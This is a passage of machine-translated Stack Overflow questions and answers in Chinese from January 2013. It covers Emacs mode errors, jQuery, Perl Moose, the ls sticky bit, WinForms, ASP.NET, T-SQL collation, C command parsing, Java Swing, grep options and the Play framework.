问题是，每当我按下`TAB`缩进一行时，我都会收到错误消息`Wrong type argument: stringp, nil`。当我打开调试器时，这是我看到的堆栈跟踪：

```
Debugger entered--Lisp error: (wrong-type-argument stringp nil)
  c-syntactic-skip-backward(nil nil t)
  c-looking-at-decl-block(nil t)
  c-guess-basic-syntax()
  c-indent-line()
  #[nil \302>\203)\212\303 \210\304\305x\210\303 \210\306 )i\306 X\203\"\307    !\202'\212\307  !))\20 \207" [indent-line-function column (indent-relative indent-relative-maybe) beginning-of-line "\n     " nil current-indentation indent-line-to] 2 1908700 nil]()
  c-indent-command(nil)
  c-indent-line-or-region(nil nil)
  call-interactively(c-indent-line-or-region nil nil) 
```

查看定义，`c-looking-at-decl-block`尤其是对 `c-syntactic-skip-backward 的调用，我发现：

```
 (c-syntactic-skip-backward c-block-prefix-charset limit t) 
```

检查第一个参数`c-block-prefix-charset`会发现它的值为`nil`。从纯 C++ 缓冲区执行相同操作会显示非`nil`值。所以，我怀疑 C++ 模式需要一些没有正确完成的初始化。

所以，我的问题是：

1.  我在实现中的 C++ 模式初始化部分缺少什么？
2.  我是否使用了正确的方法（结合`generic-x`and `mmm-mode`）？有更好的方法吗？

加载文件时，我还看到另一个错误 ( `File mode specification error`)，但我怀疑问题相同或类似。

谢谢你的时间。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T21:58:30.860

（在评论中讨论后重写，供以后的访问者使用）。

问题中的设置基本上没问题，但是要使用当前`c++-mode`版本，您需要使用`mmm-mode`. 它可以在[GitHub 项目页面](https://github.com/purcell/mmm-mode)和[Melpa](http://melpa.milkbox.net/)上找到。

相关补丁（[一](https://github.com/purcell/mmm-mode/commit/e414b5bde74afcb342c2dfba0e041407b0420304)、[二](https://github.com/purcell/mmm-mode/commit/5289a0bc6480c12c51704a3c056a3015e81af1d2)、[三](https://github.com/purcell/mmm-mode/commit/545b85d6f1fa209bd767950d84d3fdca2ab1a92d)）为 的值添加了新条目`mmm-save-local-variables`，`mmm-mode`用于决定在离开或进入子模式区域时保存或恢复哪些局部变量。

据我了解，未来的更新`cc-mode`可以添加更多此类变量，因此可能需要不时更新列表。

额外提示：为了在子区域中有更好的缩进，您可能希望`indent-line-function`使用一些代码包装子模式，这些代码会在调用它之前缩小缓冲区（[示例here](https://gist.github.com/4555250)）。根据缩进功能（以及它是否调用`widen`），它可能有帮助，也可能没有帮助。

# javascript - 尝试编写一个显示内容并隐藏其余内容的 jQuery 函数

> ID：14220580
> 
> 赞同：0
> 
> 时间：2013-01-08T17:21:22.383
> 
> 标签：javascript, jquery

我试图在我的网站上编写一个复杂的（对我而言）功能。我有 3 行，每行包含一个图像。在悬停时，我希望这个图像背景位置改变，就是这样。当用户然后单击此图像时，我希望父 div 扩展高度，图像扩展高度以及更改其背景位置。

完成此功能并单击另一张图片后，我会像上一张一样缩小尺寸，这很难解释，所以我做了一个 jsfiddle 演示，希望能给大家一个想法。

另外，由于我是 jqwuery 的新手，我有点担心我的功能看起来很臃肿，这是不好的做法还是看起来不错？

```
// On work showcase click, expand area to show information
$('.work-showcase').click(function(){
    if ( !$(this).hasClass('active') ){
        $(this).addClass('active');
        $('.work-showcase').animate({height:'135px'}, 500);
        $(this).find('ul li').animate({height:'350px'}, 500);
        $(this).find('ul li').css({
            'background-position':'bottom left',
            'background-size' : 'auto auto'
        });         
        $(this).find('ul li img').animate({height:'350px'}, 500);
        $(this).animate({height:'400px'}, 500,function() {  
            $("html, body").animate({ scrollTop: $(this).offset().top });  
        });
    } else { return false;};
}); 
```

**演示**

[http://jsfiddle.net/mx4HJ/2/](http://jsfiddle.net/mx4HJ/2/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T17:26:13.610

一个提示：如果多次使用 jquery 元素，请始终缓存它（例如

```
var el = $(this), li = el.find('ul li'); 
```

`active`对于另一个问题，只需编辑添加类的这一行：

```
$(this).addClass('active').siblings().removeClass('active'); 
```

[更新的演示](http://jsfiddle.net/mx4HJ/3/)

# perl - Moose 创建访问器

> ID：14220591
> 
> 赞同：-3
> 
> 时间：2013-01-08T17:21:59.097
> 
> 标签：perl, moose

给定访问器列表是否可能？如果有可能我将如何为每个创建构建器方法，我假设lazy_build 属性会这样做？请帮忙

```
my @accessors= qw/type duration process/; # used 3 as example but the list is about 50

foreach my $accessors (@accessors) {
has $accessors => (
    is         => 'rw',
    isa        => 'Str',
    lazy_build => 1,

);
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T17:32:27.047

是的，这是可能的。它既记录在案，又易于测试。

如[文件](http://search.cpan.org/~doy/Moose-2.0604/lib/Moose/Meta/Attribute.pm)所述，`lazy_build`不创建构建器；它指定一个属性应该被延迟初始化，并且它应该调用一个名为`_build_${attr_name}`. 您必须提供自己的构建器方法，称为`_build_type`etc。

如果您的属性都采用相同的构建器（不太可能，但可能会），请不要说`lazy_build`. 相反，说`lazy => 1, builder => '_build_stuff'`和实施`_build_stuff`适用于每种情况。但就像我说的那样，这不太可能；您可以轻松地在循环中使用它这一事实实际上是`lazy_build`'s 的优势之一。

# api - 谷歌地理编码API城市与高速公路

> ID：14220593
> 
> 赞同：3
> 
> 时间：2013-01-08T17:22:08.563
> 
> 标签：api, geocoding

我需要知道是否可以使用地理编码 API 检查我当前是否在城市或高速公路/城市外。

我知道api返回了某种视口，但我对此并不满意。

我想改变地图的缩放级别。

谢谢，

卡斯滕

# ls - ls输出中的“t”是什么意思？

> ID：14220594
> 
> 赞同：11
> 
> 时间：2013-01-08T17:22:10.200
> 
> 标签：ls

`ls`报告以下内容：

```
# ls -ld /var/lib/puppet/state/
drwxr-xr-t 3 puppet puppet 4096 Jan  8 16:53 /var/lib/puppet/state/ 
```

“t”对其他人意味着什么？什么工具报告权限的符号名称？`ls`有`--numeric-uid-gid`选项，但是还有另一个权限吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-01-08T17:23:14.677

`man ls`是你的朋友：

> t 粘滞位已设置（模式 1000），可搜索或可执行。
> （参见 chmod(1) 或 sticky(8)。）

关于[粘性位](http://en.wikipedia.org/wiki/Sticky_bit)：

> 设置后，它指示操作系统在进程退出后将程序的文本段保留在交换空间中。这通过允许内核进行将程序从交换区移动到实际内存的单个操作来加速后续执行。因此，编辑器等常用程序的加载速度会明显加快。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2015-05-12T23:12:55.923

粘性位今天令人难以置信的混乱。它不再将文件固定到内存中，使其实际上不再“粘”。有时它被称为“粘性”位，因为它表示为“t”或“T”，但其他人仍然称它为粘性。据我所知，当应用于目录时，它只在现代 linux 和 unix 中很重要。这意味着如果在目录上设置了sticky位，则具有删除文件权限的组中的人仍然不能这样做。但它变得更加混乱。它显示在最后一个字段中，这是“其他”用户的执行/搜索字段，但作用于“组”用户（“其他”普通用户永远不能删除文件）。它未显示在“组”执行字段中的原因是因为更改为“s” 如果为组设置了 SETUID 位。我认为。我还在研究那个。

# c# - 拖动不透明的表格？

> ID：14220596
> 
> 赞同：1
> 
> 时间：2013-01-08T17:22:19.327
> 
> 标签：c#, .net, winforms

我有以下代码来拖动表单并在拖动时使其透明。问题是它闪烁并且不平滑拖动。我在表格上有一张照片，不知道是不是这个原因。我怎样才能让它不闪烁。如果我删除不透明度，那么它会被快速/平滑地拖动。

```
[DllImportAttribute("user32.dll")]
public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, 
    int lParam);
[DllImportAttribute("user32.dll")]
public static extern bool ReleaseCapture();

public void Drag(MouseEventArgs e)
{
    if (e.Button == MouseButtons.Left)
    {
        this.Opacity = 0.9;
        ReleaseCapture();

        SendMessage(Handle, 0xA1, 0x2, 0);
        this.Opacity = 1;
    }
}

private void Body_MouseDown(object sender, MouseEventArgs e)
{       
    Drag(e);
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T18:52:10.383

Form 和 Control 类有许多“重”属性，需要对底层的原生 Windows 窗口进行大量更改。它们是与传递给本机 CreateWindowEx() 调用的样式标志相关联的属性。Opacity 属性以及 TransparencyKey 属性就是这样，当您将它们从默认值更改时，窗口需要另一个样式标志 WS_EX_LAYERED。

*这是一个问题，因为在创建*窗口时指定了这个样式标志。Windows 支持在使用 SetWindowsLongPtr() 创建窗口后更改它们，但这总是参差不齐。特别是对于 WS_EX_LAYERED，当它打开时，很多事情都会发生在幕后。它是通过利用视频适配器中称为“层”的硬件功能来实现的。层是一个单独的视频内存块，其像素与主内存结合在一起。支持提供不透明效果（乘法）和透明键效果（省略）的混合器。

因此，在创建窗口后即时更改 Opacity 属性是相当困难的。以至于 WPF 完全禁止它。但是 Winforms 没有，它需要处理 Windows 98 的限制。这也使得更改 ShowInTaskbar、RightToLeft、FormBorderStyle 等属性变得困难。它使用一个*技巧*来允许更改这些属性，它完全破坏了本机窗口并重新创建它，现在使用新的样式标志。

问题解决了，但这确实有明显的副作用。不可避免地，您看到的窗口消失了，新窗口被创建并绘制在同一个位置。这会导致您抱怨的闪烁。此外，破坏窗口会导致大量内部状态丢失。Winforms 尽最大努力恢复该状态以及为新窗口恢复该状态，但“我目前正在移动”状态无法恢复。模态移动循环已终止。

这个问题的解决方法是粗略但简单的。将“属性”窗口中的“不透明度”属性设置为 99%。并更改您的代码以将其恢复为 99 而不是 100。现在样式位永远不必更改，因此您将不再获得这些工件。

# c# - 如何在 Asp.net 的 Listview 中绑定 DataGrid？

> ID：14220598
> 
> 赞同：0
> 
> 时间：2013-01-08T17:22:20.183
> 
> 标签：c#, asp.net, listview, datagrid

我有以下列表视图，它有两个主要部分，其中一个`<table>`带有标签，一个`datagrid`. 我使用数据表填充字段，但我不知道如何绑定数据网格。

```
<asp:ListView 
ID="ListView1" 
    runat="server">
<LayoutTemplate>
   <div id="itemPlaceholderContainer" runat="server" >
    <div id="itemPlaceholder" runat="server" />
       </div>
</LayoutTemplate>
  <ItemTemplate>
<asp:Panel runat="server">
    <table align="center">
        <tr>
            <td>
               <cc1:SWCLabel runat="server" 
                   Text='<%# Eval("field1") %>'
               />
             </td>
             <td>
                 <cc1:SWCLabel runat="server" 
                     Text='<%# Eval("field2") %>'
                 />
             </td>
        </tr>
    </table>

  <asp:DataGrid ID="datagrid_1" runat="server">
        <Columns>
            <asp:BoundColumn  DataField="col1" HeaderText="column1 ">
            </asp:BoundColumn>
            <asp:BoundColumn  DataField="col2" HeaderText="column2 ">
            </asp:BoundColumn>
        </Columns>
    </cc1:SWCDataGrid>
  </asp:Panel>                            
 </ItemTemplate>
</asp:ListView> 
```

我的代码隐藏：

```
DataTable table = new DataTable();
// GET DATA
// . . .
ListView1.DataSource = table;
ListView1.DataBind(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T22:31:19.153

我认为如果您对我们的数据结构有所了解，将会有所帮助。因此，您尝试为 ListView 的每个元素显示一个 DataGrid。对我来说，这意味着您的 ListView 的每个元素都有一组相关数据，这些数据需要在自己的 DataGrid 中显示。为此，除了您的 Listview DataBind 代码之外，您还需要以下内容：（在 VB 中，应该很容易将其转换为 C#）

```
Protected Sub ListView1_ItemDataBound(ByVal sender As Object, ByVal e As   System.Web.UI.WebControls.ListViewItemEventArgs) Handles ListView1.ItemDataBound

        Dim theDataGrid As DataGrid = e.Item.FindControl("datagrid_1")

        Dim itemData As DataTable = GetTheItemData(e.Item.DataItem)

        theDataGrid.DataSource = itemData 
        theDataGrid.DataBind()          

 End Sub 
```

每次您的列表视图的 Item 是 DataBound 时，都会调用此处理程序。每次它获取该项目的相关数据，并使用它来填充该项目的 DataGrid。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T17:40:30.773

因为您的网格视图在项目模板中，所以在列表视图的“项目数据绑定”事件中执行此操作。

# sql - 为什么在 T-SQL 中某些 unicode 字符等于无？

> ID：14220607
> 
> 赞同：1
> 
> 时间：2013-01-08T17:22:44.270
> 
> 标签：sql, string, tsql, unicode

在我的数据库中，我有一个翻译表，其中包含用于将不寻常的 Unicode 字符转换为英文字符的字典。Unicode 字符是该表的主键。前段时间我遇到了一个问题：一些不同的 Unicode 字符对于 T-SQL 是相同的，它们同时等于没有。

我可以找到区分彼此的方法（'=' 没用），甚至设法将其中一个插入数据库。但是由于主键约束，我不能插入一个以上，而它们都是相等的。

我只发现了 4 个：Ș ș Ț ț。但是 4 足以破坏我的系统。

这是关于它们如何表现的简短但内容丰富的示例：

```
DECLARE @Strings TABLE(id int, ucode nvarchar(50))
INSERT INTO @Strings (id, ucode)
    SELECT 1, N'A' UNION -- Usual char
    SELECT 2, N'Ы' UNION -- Some unicode char    
    SELECT 3, N'Ф' UNION -- Another unicode char
    SELECT 5, N' ' UNION -- space
    SELECT 6, N'Ș' UNION -- Unusual unicode char
    SELECT 7, N'Ț' UNION -- Unusual unicode char
    SELECT 8, N'some_string' UNION      -- example string
    SELECT 9, N'some_string ' UNION     -- example string with space
    SELECT 10, N'some_string Ș' UNION   -- example string with unusual char
    SELECT 11, N'some_string Ț'         -- one more

 SELECT * FROM @Strings
 SELECT * FROM @Strings WHERE ucode = N'A'  -- Good one (1 result)
 SELECT * FROM @Strings WHERE ucode = N'Ș'  -- Magic (3 results)
 SELECT * FROM @Strings WHERE ucode = N'Ț'  -- Magic (3 results)
 SELECT * FROM @Strings WHERE ucode = ''    -- Magic (3 results)
 SELECT * FROM @Strings WHERE ucode = 'some_string' -- Magic (4 results) 
```

你有什么建议吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-08T17:33:17.580

`=`不是没用，但你需要指定`=`应该如何比较。默认是在数据库级别设置的，你的列没有指定不同的比较规则，所以你的列获取数据库的比较规则。主键使用与 相同的比较规则`=`，因此为一个主键修复它也会使另一个按您的意愿工作。

[`COLLATE`使用关键字](http://msdn.microsoft.com/en-us/library/ms184391.aspx)指定比较规则。应该将所有代码点视为不同字符的一种排序规则是`Latin1_General_BIN2`.

```
DECLARE @Strings TABLE(id int, ucode nvarchar(50) COLLATE Latin1_General_BIN2) 
```

# c - 自定义命令行解析算法

> ID：14220609
> 
> 赞同：0
> 
> 时间：2013-01-08T17:22:53.070
> 
> 标签：c, algorithm, parsing, data-structures

我正在尝试实现具有特定于我的应用程序的 cmd 的自定义 cmd 行。

命令是单个单词或多个单词。比如说

```
-#version      //single word cmd

-#show input pressure  //Multiple word cmds
-#show input temp 
```

为了解析和调用相应的函数指针，我有两个用于上述 cmd 的表。

**表 1：**基本 Cmd 表

```
typedef struct CommandStruct{
  char (*f)(uint8 argn, const char **argv);
  char  *fname;
  char  *help;
}CommandStruct;

/*Help information*/
char version_help[] = " Usage:Version \n Command Displays the version information.\n";
char ShowInput_help[] = " \nUsage: \n show input pressure  --Shows input pressure \n \
show input temp -- shows input temperature \n";

 /*Table1 - Basic set of commands*/
CommandStruct basic_command_list[] =
{
   /* function name , cmd name , help information */
   {version    , "version"  , version_help },
   {clear      , "clear"    ,"Clear the screen" },
   {quit       , "quit"     ,"Exit from the prompt" },
   {ShowInput  , "show input", ShowInput_help }, 
   {NULL       ,  NULL      , NULL  }
}; 

  -#show input pressure 
  -#show input temp 
```

上述 2 个 cmds 属于表 1 中的“显示输入”。

在当前算法中，在将输入字符串拆分为标记时，我检查它是单字还是双字。如果是单个单词，我直接调用该函数。如果有多个单词（例如显示输入温度），我会采用前 2 个标记（即“显示输入”并尝试在子表中过滤和搜索。（这里是它的表 2）。

```
 /*Table 2 : Sub cmd for the cmds starting with 'show input' */
    CommandStruct show_input_command_list[] =
    {
       /* function name , cmd name , help information */
       {ShowInputPressure  , "pressure", ShowInput_help },
       {ShowInputTemp  , "temp",ShowInput_help},
       {NULL       ,  NULL      , NULL  }
    }; 
```

这样我继续说下面的 cmds 我比较并找到“显示网络”一旦匹配然后我搜索具有网络命令的 table3。

其他一些 cmds 就像

```
show network ipaddress     
show network ipsubnet   
show network abcd<#>

set network ipaddress <#>
set network ipsubnet <#>
set network abcd <#>  <#> 
```

所以我必须将 ShowNetwork 添加到表 1 并创建一个新表 show_network_command_list[] 并添加其他三个 cmd .etc 。

如何改进这个算法？如果有更好的解决方案，请建议我。谢谢。

# c# - System::IntPtr 到 C++/CLI 中的 int*

> ID：14220611
> 
> 赞同：5
> 
> 时间：2013-01-08T17:22:54.047
> 
> 标签：c#, c++, interop, c++-cli

我正在尝试使用 C++/CLI 互操作层从 C# 应用程序调用现有的 C++ 库。我有一个看起来像这样的 C++ 函数：

```
void doSomething(int* foo, int size); 
```

以及一个包含两个字段的 C# 对象，一个 IntPtr start 和一个 int 大小。我编写了一个托管 C++ 类，如下所示：

```
public ref class Wrapper {
public:
    void run(System::IntPtr itn, int size);
}; 
```

现在我想在 Wrapper::run 中调用 doSomething，并让 doSomething 可以访问 C# 对象指向的同一块数据。如果没有副本，我正在尝试做的事情是否可行，如果可以，怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T17:49:28.367

要从*Wrapper::run*调用*doSomething*，请尝试转换[System::IntPtr::ToPointer](http://msdn.microsoft.com/en-us/library/system.intptr.topointer.aspx)的返回值，如下所示：

 *```
doSomething(reinterpret_cast<int*>(itn.ToPointer()), size); 
```*

# java - 从 Java 操作终端会话

> ID：14220612
> 
> 赞同：4
> 
> 时间：2013-01-08T17:23:01.103
> 
> 标签：java, linux

我正在尝试用 Java 制作终端模拟器。java 程序将接受来自用户的命令，并将其输出显示给他们。我可以模拟像“ls”这样的简单命令，但我不知道如何处理像“cd”这样的命令。这是因为，我使用 exec() 方法来执行终端命令。因此，所有命令都在当前目录执行。'cd ..' 之类的命令被执行，但它们没有持久的效果，因为每个命令都是由 exec() 单独执行的。
任何想法我如何模拟整个会话？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-08T17:27:21.660

如果您正在使用 执行命令`exec()`，那么您不是在编写终端仿真器；你正在写一个shell。在这种情况下，您将需要跟踪 shell 跟踪的内容，例如环境变量和工作目录。

如果您真的想编写终端仿真器，您将通过伪终端与 shell 进程对话。然后，您的程序将只跟踪终端跟踪的内容，例如线路状态和屏幕上显示的内容。

使用 Java 的伪终端会有点棘手，因为大多数文档都假设您使用的是 C api。 `man pty`应该让你开始。您的 Java 进程必须使用 FileStream 对象打开伪终端的主端。我不确定Java中有没有办法让子进程打开伪终端的从属端；您可能必须调用一个 shell 命令`exec()`来启动另一个 shell 命令，并将标准输入/输出/错误重定向到伪终端的从属端。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-08T17:31:14.270

JSch 是 SSH2 的纯 Java 实现。JSch 允许你连接到一个 sshd 服务器并使用端口转发、X11 转发、文件传输等，你可以将它的功能集成到你自己的 Java 程序中。

[http://www.jcraft.com/jsch/](http://www.jcraft.com/jsch/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-04-01T17:09:00.647

您真的应该尝试一下 Ganymed。

> Ganymed SSH-2 for Java 是一个在纯 Java 中实现 SSH-2 协议的库（在 J2SE 1.4.2 和 5.0 上测试）。它允许从 Java 程序中连接到 SSH 服务器。它支持 SSH 会话（远程命令执行和 shell 访问）、本地和远程端口转发、本地流转发、X11 转发、SCP 和 SFTP。

[http://www.ganymed.ethz.ch/ssh2/](http://www.ganymed.ethz.ch/ssh2/)

Ganymed 与 apache FTP 客户端一起，您还可以下载和上传文件。

**Ganymed 中还有一个用于终端仿真的内置示例代码。**

以下是使用 Ganymed 和 apache FTP 客户端完成的项目的链接。

> [GitHub](https://github.com/sridharan99/Cloud)

编码快乐！！

# c# - NET Framework 从 v3.5 迁移到 v4.0

> ID：14220619
> 
> 赞同：12
> 
> 时间：2013-01-08T17:23:14.617
> 
> 标签：c#, frameworks

我有一个 Visual Studio 2008 解决方案和 .NET Framework v3.5。最近我已经转换成 Visual Studio 2010 和 .NET Framework v4.0。

要更改为 .NET Framework v4.0，我已通过项目属性和构建选项卡完成，方法是将每个项目的目标更改为目标 Framework v4.0。但是，如果我打开配置项目文件 csproj，我可以看到有一个与 v3.5 相关的标签：

```
 <ItemGroup>
   <Reference Include="System" />
   <Reference Include="System.Core">
    <RequiredTargetFramework>3.5</RequiredTargetFramework>
   </Reference>
   <Reference Include="System.Data" />
   <Reference Include="System.Drawing" />
   <Reference Include="System.Xml" />
   <Reference Include="WindowsBase">
    <RequiredTargetFramework>3.0</RequiredTargetFramework>
   </Reference>
 </ItemGroup> 
```

如果项目针对.NET Framework v4.0，我想知道为什么某些包含的参考引用v3.0、v3.5 框架。尽管项目的目标是 NET 框架 v4.0，但其他项目也会发生这种情况。

System.Core 面向 3.5 WindowsBase 面向 3.0

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T17:25:34.140

这些引用本身需要 3.5（对于 System.Core）和 3.0（对于 WindowsBase）。实际上，这不是 100% 正确的（请参阅 Ramhound 对此答案的评论）。

到目前为止，任何高于 2.0 的 .NET 框架本质上都是位于 2.0 之上的 DLL。例如，几年前的一份工作，我需要 .NET 2.0 中的 LINQ 和 Hashset<T>，因为我的一半用户都卡在 Win2K 上，它不支持 .NET 2.0 以上的任何东西。[我最终从Mono](http://www.mono-project.com/Main_Page)重新编译 System.Core并将其定位为 2.0，并且能够使用更新的功能。

我不认为这是你需要担心的任何事情。

# ms-access-2007 - 使用查询 (Access 2007) 将计算结果保存在表中？

> ID：14220620
> 
> 赞同：1
> 
> 时间：2013-01-08T17:23:14.760
> 
> 标签：ms-access-2007

我有一个包含多个项目站点的表格，其中一个字段标记为“项目开始日期”。我在标有“预计项目完成日期”的表单中有另一个字段。这两个字段都存储在标有“常规项目信息”的表中（嗯，至少这是表单信息的来源）。

我可以通过向项目开始日期添加 10 天来手动填写建议的项目完成日期，但我想将其设为计算字段，即一旦有人输入项目开始日期，访问会自动计算建议的项目完成日期。

我知道您可以使用查询来计算：新查询--> 包括项目 ID 和项目开始日期字段，然后创建第三个字段--> 建议完成日期：DateAdd("d",10,[项目开始日期]）。这将产生一个查询结果，其中有一列包含所有站点、一列包含项目开始日期和一列包含 10 天后的日期。完美的。但是，我如何将这些新结果存储在我现有的 General Project Info 表中并让它们出现在表单中？我显然是一个初学者，并且缺少一些东西。

感谢您在这件事上的任何帮助。

哦，我正在使用 Access 2007。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T17:39:05.847

您可以使用表单上项目开始日期的更新后事件将项目结束日期控件更新为项目开始日期 + 10，但如果答案总是 + 10，为什么还要存储日期呢？只需使用您的查询来显示结束日期。

```
Private Sub StartDate_AfterUpdate()
     Me.EndDate = Me.StartDate + 10
End Sub 
```

或者

```
SELECT StartDate, StartDate + 10 As EndDate FROM ATable 
```

编辑

要添加更新后事件，请使用表单设计视图中的属性表。选择[事件程序]，然后单击三个小点。它将打开代码窗口，您可以将代码添加到事件中。您需要为控件使用正确的名称，但如果您键入`Me.`，智能感知将帮助您使用属性、方法和控件的名称。

![事件](../Images/d644c961f76ceab29c11cdcb7e5a14d5.png)

# java - 删除行时Jtable刷新

> ID：14220621
> 
> 赞同：1
> 
> 时间：2013-01-08T17:23:22.377
> 
> 标签：java, swing, jtable, tablemodel

我有一张表格，可以正确显示 txt 文件中的所有书单。我在框架中添加了一个新按钮，当获取 id 编号及其文本字段时，如果找到，则从文件中删除它的记录，但如果我也想从表中删除，我应该重新显示表框。我想，当从文件中删除一条记录时，我的表格会自动刷新，而无需重新显示表格框架。我的代码是这样的：

```
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.JTextField;

public class ReadBookFileToListM {

public ReadBookFileToListM(){
   final ReadBookFileToList rbftl=new ReadBookFileToList();
   final JFrame Bframe=new JFrame("All Book List");
  final JTextField tf1=new JTextField("             ");
  final JLabel foundlable=new JLabel();
    JButton button1=new JButton("Back To Main Page");
    JButton button2=new JButton("Exit");
    JButton button3=new JButton("Delete Book");
    button1.addActionListener(new ActionListener() {
        public void actionPerformed(ActionEvent e) {
            Bframe.setVisible(false);
            new MainFrame().setVisible(true);
        }
    });
    button2.addActionListener(new ActionListener() {

        public void actionPerformed(ActionEvent e) {
            System.exit(0);
        }
    });

    JTable Btable=new JTable(rbftl);

    button3.addActionListener(new ActionListener() {

        public void actionPerformed(ActionEvent e) {
            boolean find=false;
    String Bookid=tf1.getText();
    File Mf=new File("D:\\AllBookRecords.txt");
    File Tf=new File("D:\\Boutput.txt");
    try{
        FileReader Bfr=new FileReader(Mf);
        BufferedReader Bbr=new BufferedReader(Bfr);
        PrintWriter Bpw=new PrintWriter(new FileWriter(Tf));
        String Bs;
        while( (Bs=Bbr.readLine()) != null ){
                String[] Ust=Bs.split("   ");
                String Bname=Ust[0];
                String Bdate=Ust[1];
                String id=Ust[2];
            if(id.equals(Bookid.trim())){
                find=true;
                foundlable.setText("Book Found,    "+ Bname + "  " + Bdate);
            }
            if(!id.equals(Bookid.trim())){
                Bpw.println(Bs);
            }
        }
        Bpw.close();
        Bbr.close();
        Mf.delete();
        Tf.renameTo(Mf);

    } catch(FileNotFoundException fnfe){
        foundlable.setText("File Not Found");
    } catch(IOException ioe){
        foundlable.setText("IO Error");
        ioe.printStackTrace();
    }
    finally{
        rbftl.fireTableDataChanged();
        if(find)
        foundlable.setText("Book Deleted");
        else
            foundlable.setText("Book Not Found!");
            tf1.setText("     ");
    }
        }
    });

    JPanel panel=new JPanel();
    JScrollPane sp=new JScrollPane(Btable);
    button1.setToolTipText("To Go Main Page, Click here");
    button2.setToolTipText("Terminate Program");
    panel.add(sp);
    panel.add(button1);
    panel.add(button2);
    panel.add(button3);
    panel.add(tf1);
    panel.add(foundlable);
    Bframe.add(panel);
    Btable.setAutoCreateRowSorter(true);
    Bframe.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    Bframe.setBounds(300, 60, 550, 550);
    Bframe.setVisible(true);
}

public static void main(String[] args){
    new ReadBookFileToListM();
}
  } 
```

谢谢你。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-08T18:32:09.797

addNotify() 方法 JTable 对象可能很有用，因为它重新配置了封闭的滚动窗格。

只需`tableName.addNotify()`在删除表中的行后添加。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-08T17:43:17.760

鉴于您可以确定要删除哪一行，您可以使用以下内容，

[`AbstractTableModel#fireTableRowsDeleted`](http://docs.oracle.com/javase/7/docs/api/javax/swing/table/AbstractTableModel.html#fireTableRowsDeleted%28int,%20int%29)

然后，如果需要，发出重绘请求。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-08T17:44:08.753

如果我理解正确，您想从表中删除一行？

如果是这样，您应该从您的行中删除该行`TableModel`并触发相应的表更改事件，让表知道您已删除该行

# grep - grep 与 --include 和 --exclude

> ID：14220623
> 
> 赞同：4
> 
> 时间：2013-01-08T17:23:29.840
> 
> 标签：grep

`foo`我想在目录中搜索一个字符串`app`，但不包括文件名中包含`migrations`的任何文件。我希望这个`grep`命令能够工作

```
grep -Ir --include "*.py" --exclude "*migrations*" foo app/ 
```

上面的命令似乎忽略了`--exclude`过滤器。作为替代方案，我可以做

```
grep -Ir --include "*.py" foo app/ | grep -v migrations 
```

这行得通，但这会`foo`在结果中失去突出显示。我也可以`find`加入其中并保持突出显示。

```
find app/ -name "*.py" -print0 | xargs -0 grep --exclude "*migrations*" foo 
```

我只是想知道我是否遗漏了有关将命令行参数组合到 grep 的内容，或者它们是否根本不能一起工作。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-08-07T16:09:59.640

我在 .py 文件上寻找一个术语，但不想扫描迁移文件，所以我发现（对于 grep 2.10）如下（我希望这会有所帮助）：

```
grep -nR --include="*.py" --exclude-dir=migrations whatever_you_are_looking_for . 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T19:02:07.157

`man grep`说：

```
 --include=GLOB
          Search only files whose base name  matches  GLOB  (using  wildcard  matching  as  described  under
          --exclude). 
```

因为它在那里说“只有”，我猜你的`--include`陈述正在压倒你的`--exclude`陈述。

# java - 在模板中呈现填写好的表格

> ID：14220628
> 
> 赞同：0
> 
> 时间：2013-01-08T17:23:40.417
> 
> 标签：java, playframework-2.0

我正在使用播放！java项目上的framework 20，我在将表单传递给视图时遇到问题。

在控制器中，我有以下代码：

```
Filter filter = new Filter();
//add some state to the filter object
Form<Filter> filterForm = form(Filter.class).fill(filter);
Logger.info("FilterForm: " + filterForm.get().toString()); // So far so good
return ok(filterView.render(filterForm)); 
```

在模板中：

```
@filterForm.hasErrors() // renders false
@filterForm.data().isEmpty() // renders true!!
@*  @filterForm.get().toString()  *@ throws an Exception: No Value 
```

如果在控制器中通过 Map 填充过滤器状态，我也会得到相同的错误：

```
filterForm = filterForm.bind(aMapWithTheState); 
```

只有在代码中填充过滤器时才会出现这种行为。当我`filterForm.bindFromRequest()`用其他方法做的时候一切正常。

谢谢！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-09T16:02:55.367

解决了。

`bind`我必须像以前一样使用带有状态的地图来使用表单的方法。但正确的方法是也传递属性名称：

```
Map<String, String> formState = new HashMap<String, String>();
formState.put("name", name);
formState.put("birthDate", birthDate);
formState.put("address", address);

filterForm = filterForm.bind(formState, "name", "birthDate", "address"); 
```

尽管[文档](https://github.com/playframework/Play20/wiki/JavaForms)说属性名称不是强制性的。

# javafx - 一个包中的两个类 FXMLLoader 错误

> ID：14220629
> 
> 赞同：0
> 
> 时间：2013-01-08T17:23:41.867
> 
> 标签：javafx

